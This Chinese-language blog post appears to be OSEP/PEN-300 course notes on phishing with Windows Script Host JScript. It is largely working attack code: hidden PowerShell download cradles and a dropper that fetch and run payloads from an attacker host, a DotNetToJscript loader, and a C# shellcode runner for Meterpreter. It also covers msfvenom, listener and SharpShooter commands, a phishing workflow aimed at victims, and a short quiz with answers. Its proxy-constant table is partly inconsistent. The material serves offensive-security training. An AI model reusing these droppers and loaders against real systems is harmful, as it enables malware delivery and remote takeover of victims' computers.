---
title: OSEP-04-JScript完整指南
description: '04-JScript攻击 | 02-JScript完整指南'
pubDate: 2026-01-30T00:00:29+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Windows Script Host - JScript 完整指南

## 写在前面

Windows Script Host (WSH) 是 Windows 内置的脚本执行环境，支持 JScript 和 VBScript。由于 JScript 文件（.js）双击即可执行，它成为了钓鱼攻击的理想载体。

**Web 安全类比**：
- JScript 就像是服务器端的 JavaScript，可以访问系统资源
- DotNetToJscript 就像是在 JavaScript 中嵌入 WebAssembly

---

## 第一部分：JScript 基础

### 1.1 什么是 Windows Script Host？

```
Windows Script Host (WSH)
┌─────────────────────────────────────────────────────────────┐
│  WSH 是 Windows 内置的脚本执行引擎                          │
│                                                             │
│  支持的脚本类型：                                           │
│  - JScript (.js) - Microsoft 的 JavaScript 实现            │
│  - VBScript (.vbs) - Visual Basic 脚本                     │
│                                                             │
│  执行方式：                                                 │
│  - wscript.exe - 图形界面执行                               │
│  - cscript.exe - 命令行执行                                 │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 为什么 JScript 适合钓鱼攻击？

| 特性 | 说明 |
|------|------|
| 双击执行 | .js 文件默认关联到 wscript.exe |
| 无沙箱 | 不像浏览器中的 JS，可以访问系统资源 |
| ActiveX 支持 | 可以创建 COM 对象，执行系统命令 |
| 内置 | 所有 Windows 系统都有 WSH |

### 1.3 对比：浏览器 JS vs WSH JScript

```
浏览器中的 JavaScript：
┌─────────────────────────────────────────────────────────────┐
│  ❌ 不能访问文件系统                                        │
│  ❌ 不能执行系统命令                                        │
│  ❌ 受同源策略限制                                          │
│  ❌ 在沙箱中运行                                            │
└─────────────────────────────────────────────────────────────┘

WSH 中的 JScript：
┌─────────────────────────────────────────────────────────────┐
│  ✅ 可以访问文件系统                                        │
│  ✅ 可以执行系统命令                                        │
│  ✅ 可以创建 COM 对象                                       │
│  ✅ 无沙箱限制                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 第二部分：基础 JScript 代码

### 2.1 执行系统命令

```javascript
// 最简单的命令执行
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe");
```

### 2.2 隐藏窗口执行

```javascript
// Run 方法的第二个参数控制窗口显示
// 0 = 隐藏窗口
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c calc.exe", 0);
```

### 2.3 执行 PowerShell

```javascript
// 执行 PowerShell 命令
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')\"", 0);
```

---

## 第三部分：JScript Dropper

### 3.1 下载并执行 EXE

```javascript
// ============================================================
// JScript Dropper - 下载并执行 EXE
// ============================================================

// 目标 URL
var url = "http://192.168.1.100/payload.exe";

// 创建 HTTP 请求对象
var xhr = WScript.CreateObject("MSXML2.XMLHTTP");

// 发送 GET 请求
xhr.Open("GET", url, false);
xhr.Send();

// 检查请求是否成功
if (xhr.Status == 200) {
    // 创建 Stream 对象保存二进制数据
    var stream = WScript.CreateObject("ADODB.Stream");

    stream.Open();
    stream.Type = 1;  // adTypeBinary
    stream.Write(xhr.ResponseBody);
    stream.Position = 0;

    // 保存到文件
    stream.SaveToFile("payload.exe", 2);  // 2 = adSaveCreateOverWrite
    stream.Close();
}

// 执行下载的文件
var shell = new ActiveXObject("WScript.Shell");
shell.Run("payload.exe", 0);
```

### 3.2 代码详解

#### MSXML2.XMLHTTP 对象

```javascript
var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
xhr.Open("GET", url, false);  // false = 同步请求
xhr.Send();
```

- `MSXML2.XMLHTTP` 是 Microsoft XML 核心服务的 HTTP 解析器
- `Open` 方法：第一个参数是 HTTP 方法，第二个是 URL，第三个是是否异步

#### ADODB.Stream 对象

```javascript
var stream = WScript.CreateObject("ADODB.Stream");
stream.Type = 1;  // 1 = 二进制模式
stream.Write(xhr.ResponseBody);
stream.SaveToFile("payload.exe", 2);
```

- `ADODB.Stream` 用于处理二进制数据
- `Type = 1` 表示二进制模式
- `SaveToFile` 的第二个参数 `2` 表示覆盖已存在的文件

---

## 第四部分：DotNetToJscript

### 4.1 什么是 DotNetToJscript？

```
DotNetToJscript 的作用：
┌─────────────────────────────────────────────────────────────┐
│  将编译好的 C# 程序集（DLL）转换为 JScript 可执行的格式     │
│                                                             │
│  工作流程：                                                 │
│  1. 编写 C# 代码（如 Shellcode Runner）                     │
│  2. 编译为 DLL                                              │
│  3. 使用 DotNetToJscript 转换为 JScript                     │
│  4. 双击 .js 文件执行 C# 代码                               │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 为什么使用 DotNetToJscript？

| 优势 | 说明 |
|------|------|
| 内存执行 | C# 代码在内存中执行，不写入磁盘 |
| 绕过检测 | 比直接下载 EXE 更隐蔽 |
| 功能强大 | 可以调用 Win32 API |
| 灵活性 | 可以执行任意 C# 代码 |

### 4.3 DotNetToJscript 工作原理

```
1. C# 代码编译为 DLL
   ┌─────────────────────────────────────────────────────────┐
   │  TestClass.cs → ExampleAssembly.dll                     │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
2. DotNetToJscript 转换
   ┌─────────────────────────────────────────────────────────┐
   │  - 将 DLL 序列化为 Base64 字符串                        │
   │  - 生成 JScript 代码来反序列化和执行                    │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
3. JScript 执行
   ┌─────────────────────────────────────────────────────────┐
   │  - Base64 解码                                          │
   │  - 反序列化为 .NET 对象                                 │
   │  - 调用 DynamicInvoke 执行                              │
   └─────────────────────────────────────────────────────────┘
```

### 4.4 生成的 JScript 代码分析

```javascript
// 设置 .NET 版本
function setversion() {
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}

// Base64 解码函数
function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    return ms;
}

// Base64 编码的 C# 程序集
var serialized_obj = "AAEAAAD/////AQAAAA...";

// 要执行的类名
var entry_class = 'TestClass';

try {
    // 设置 .NET 版本
    setversion();

    // 解码 Base64
    var stm = base64ToStream(serialized_obj);

    // 创建 BinaryFormatter 进行反序列化
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');

    // 反序列化
    var d = fmt.Deserialize_2(stm);

    // 创建空参数数组
    var al = new ActiveXObject('System.Collections.ArrayList');
    al.Add(undefined);

    // 执行 C# 代码
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

} catch (e) {
    // 错误处理
}
```

---

## 第五部分：C# Shellcode Runner

### 5.1 基础 C# Shellcode Runner

```csharp
// TestClass.cs - 用于 DotNetToJscript
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass
{
    // 导入 Win32 API
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    // 构造函数 - DotNetToJscript 会调用这个
    public TestClass()
    {
        // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_https ... -f csharp)
        byte[] buf = new byte[626] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            // ... 替换为你的 shellcode ...
            0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
        };

        int size = buf.Length;

        // 分配可执行内存
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        // 复制 shellcode
        Marshal.Copy(buf, 0, addr, size);

        // 创建线程执行
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        // 等待执行完成
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

### 5.2 编译和转换步骤

```bash
# 1. 在 Visual Studio 中编译 ExampleAssembly 项目
#    生成 ExampleAssembly.dll

# 2. 使用 DotNetToJscript 转换
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js

# 3. 设置 Metasploit 监听器
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
exploit -j

# 4. 双击 runner.js 执行
```

---

## 第六部分：SharpShooter

### 6.1 什么是 SharpShooter？

SharpShooter 是一个自动化工具，可以：
- 生成各种格式的 payload（JScript, VBScript, HTA 等）
- 自动处理 DotNetToJscript 转换
- 支持多种绕过技术

### 6.2 安装 SharpShooter

```bash
# 安装依赖
cd /opt
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter
sudo pip2 install -r requirements.txt
```

### 6.3 使用 SharpShooter

```bash
# 生成 raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f raw \
    -o /var/www/html/shell.txt

# 使用 SharpShooter 生成 JScript
python2 SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.txt \
    --output test
```

---

## 第七部分：代理感知

### 7.1 设置代理

```javascript
// JScript 代理感知下载
var url = "http://192.168.1.100/payload.exe";
var xhr = WScript.CreateObject("MSXML2.ServerXMLHTTP");

// 设置代理
xhr.setProxy(2, "192.168.1.10:8080", "");  // 2 = SXH_PROXY_SET_PROXY

xhr.Open("GET", url, false);
xhr.Send();

// ... 后续代码
```

### 7.2 代理类型

| 值 | 常量 | 说明 |
|----|------|------|
| 0 | SXH_PROXY_SET_DEFAULT | 使用系统默认代理 |
| 1 | SXH_PROXY_SET_PRECONFIG | 使用 IE 代理设置 |
| 2 | SXH_PROXY_SET_DIRECT | 直接连接（不使用代理） |
| 2 | SXH_PROXY_SET_PROXY | 使用指定的代理 |

---

## 第八部分：完整攻击流程

### 8.1 攻击流程图

```
1. 生成 Shellcode
   ┌─────────────────────────────────────────────────────────┐
   │  msfvenom -p windows/x64/meterpreter/reverse_https ...  │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
2. 创建 C# Shellcode Runner
   ┌─────────────────────────────────────────────────────────┐
   │  编写 TestClass.cs，包含 shellcode 和执行代码           │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
3. 编译为 DLL
   ┌─────────────────────────────────────────────────────────┐
   │  Visual Studio → Build → ExampleAssembly.dll            │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
4. 转换为 JScript
   ┌─────────────────────────────────────────────────────────┐
   │  DotNetToJScript.exe ExampleAssembly.dll -o runner.js   │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
5. 发送钓鱼邮件
   ┌─────────────────────────────────────────────────────────┐
   │  附件: runner.js 或 runner.js.zip                       │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
6. 受害者双击执行
   ┌─────────────────────────────────────────────────────────┐
   │  wscript.exe 执行 JScript → C# 代码在内存中执行         │
   └─────────────────────────────────────────────────────────┘
                            │
                            ▼
7. 获得 Shell
   ┌─────────────────────────────────────────────────────────┐
   │  Meterpreter 连接到攻击者的监听器                       │
   └─────────────────────────────────────────────────────────┘
```

---

## 第九部分：代码汇总

### 9.1 简单命令执行

```javascript
var shell = new ActiveXObject("WScript.Shell");
shell.Run("calc.exe", 0);
```

### 9.2 PowerShell 下载摇篮

```javascript
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')\"";
shell.Run(cmd, 0);
```

### 9.3 完整 Dropper

```javascript
var url = "http://192.168.1.100/payload.exe";
var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
xhr.Open("GET", url, false);
xhr.Send();

if (xhr.Status == 200) {
    var stream = WScript.CreateObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;
    stream.Write(xhr.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile("payload.exe", 2);
    stream.Close();
}

var shell = new ActiveXObject("WScript.Shell");
shell.Run("payload.exe", 0);
```

---

## 第十部分：练习题

### 选择题

1. JScript 文件的默认执行程序是什么？
   - A) cmd.exe
   - B) powershell.exe
   - C) wscript.exe
   - D) cscript.exe

2. DotNetToJscript 的作用是什么？
   - A) 将 JScript 转换为 C#
   - B) 将 C# 程序集转换为 JScript 可执行格式
   - C) 编译 JScript 代码
   - D) 加密 JScript 代码

3. ADODB.Stream 的 Type = 1 表示什么？
   - A) 文本模式
   - B) 二进制模式
   - C) Unicode 模式
   - D) ASCII 模式

4. 在 DotNetToJscript 生成的代码中，哪个方法用于执行 C# 代码？
   - A) Execute()
   - B) Run()
   - C) DynamicInvoke()
   - D) Invoke()

5. WSH JScript 相比浏览器 JavaScript 的主要优势是什么？
   - A) 执行速度更快
   - B) 可以访问系统资源，无沙箱限制
   - C) 语法更简单
   - D) 兼容性更好

### 答案

1-C, 2-B, 3-B, 4-C, 5-B

---

## 下一步

掌握了 JScript 攻击技术后，继续学习 [05-反射式PowerShell](/blog/osep/05-反射式powershell/00-章节指南/)，了解如何避免 Add-Type 的磁盘写入问题。
